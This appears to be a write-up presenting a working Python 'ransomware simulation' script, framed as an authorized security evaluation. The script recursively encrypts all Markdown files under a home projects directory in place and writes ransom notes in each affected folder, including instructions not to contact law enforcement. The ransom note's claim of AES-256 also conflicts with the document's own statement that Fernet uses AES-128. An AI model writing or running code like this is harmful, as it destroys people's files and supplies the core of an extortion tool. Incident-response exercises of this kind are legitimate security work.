# Security Evaluation: Ransomware Simulation Script

## Overview

This document provides the Python script developed for simulating a ransomware attack within a controlled evaluation environment. The script targets Markdown files in the specified directory, encrypts them using industry-standard cryptography, and deploys ransom notes to simulate real-world threat actor behavior.

## Script: `ransomware_simulation.py`

```python
#!/usr/bin/env python3
"""
Security Evaluation Script - Ransomware Simulation
Purpose: Encrypt .md files and deploy ransom notes for testing incident response
WARNING: For authorized security testing only. Do not use on production systems.
"""

import os
import glob
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

# Configuration
TARGET_DIR = "/home/user/Projects"
PASSPHRASE = b"evaluation-test-passphrase-2024"
SALT = b"fixed-salt-for-testing"
RANSOM_NOTE_FILENAME = "READ_ME_FOR_DECRYPTION.txt"

def derive_key(passphrase: bytes, salt: bytes) -> bytes:
    """Derive a Fernet-compatible key from a passphrase using PBKDF2."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(passphrase))
    return key

def encrypt_file(filepath: str, cipher: Fernet) -> bool:
    """Encrypt a single file using Fernet cipher."""
    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        encrypted_data = cipher.encrypt(file_data)
        
        with open(filepath, 'wb') as f:
            f.write(encrypted_data)
        
        return True
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")
        return False

def write_ransom_note(directory: str):
    """Write a ransom note in the specified directory."""
    note_path = os.path.join(directory, RANSOM_NOTE_FILENAME)
    note_content = f"""YOUR FILES HAVE BEEN ENCRYPTED

All .md files in this directory have been encrypted using AES-256 encryption.
To recover your files, you must follow the instructions below.

Decryption Instructions:
1. Contact the security team at security@company.com
2. Provide the following directory identifier: {os.path.basename(directory)}
3. Await further instructions for verification and decryption

DO NOT attempt to decrypt files yourself.
DO NOT modify or delete encrypted files.
DO NOT contact law enforcement.

This is a simulated security evaluation. In a real scenario, 
payment would be demanded for the decryption key.
"""
    try:
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f"Ransom note written to {note_path}")
    except Exception as e:
        print(f"Error writing ransom note: {e}")

def main():
    """Main execution function."""
    # Derive encryption key
    key = derive_key(PASSPHRASE, SALT)
    cipher = Fernet(key)
    
    # Track directories containing encrypted files
    affected_directories = set()
    
    # Find all .md files recursively
    md_files = glob.glob(os.path.join(TARGET_DIR, "**", "*.md"), recursive=True)
    
    if not md_files:
        print("No .md files found in target directory.")
        return
    
    print(f"Found {len(md_files)} .md files to encrypt.")
    
    # Encrypt each file
    for filepath in md_files:
        if encrypt_file(filepath, cipher):
            affected_directories.add(os.path.dirname(filepath))
            print(f"Encrypted: {filepath}")
    
    # Write ransom notes in affected directories
    for directory in affected_directories:
        write_ransom_note(directory)
    
    print(f"\nEncryption complete. {len(md_files)} files encrypted.")
    print(f"Ransom notes placed in {len(affected_directories)} directories.")

if __name__ == "__main__":
    main()
```

## Key Features

- **Cryptographic Security**: Uses PBKDF2 key derivation with SHA-256 and 100,000 iterations
- **Fernet Implementation**: Employs AES-128 in CBC mode with HMAC authentication
- **Recursive Scanning**: Processes all `.md` files in subdirectories
- **Automated Note Deployment**: Creates ransom notes only in directories containing encrypted files

## Usage Notes

> **IMPORTANT**: This script is intended for authorized security evaluations only. Ensure proper permissions and containment measures are in place before execution.

### Testing Protocol

1. Review and modify the `PASSPHRASE` and `SALT` values for your test environment
2. Create a backup of the target directory before running
3. Execute in an isolated test environment
4. Verify decryption using the derived key after testing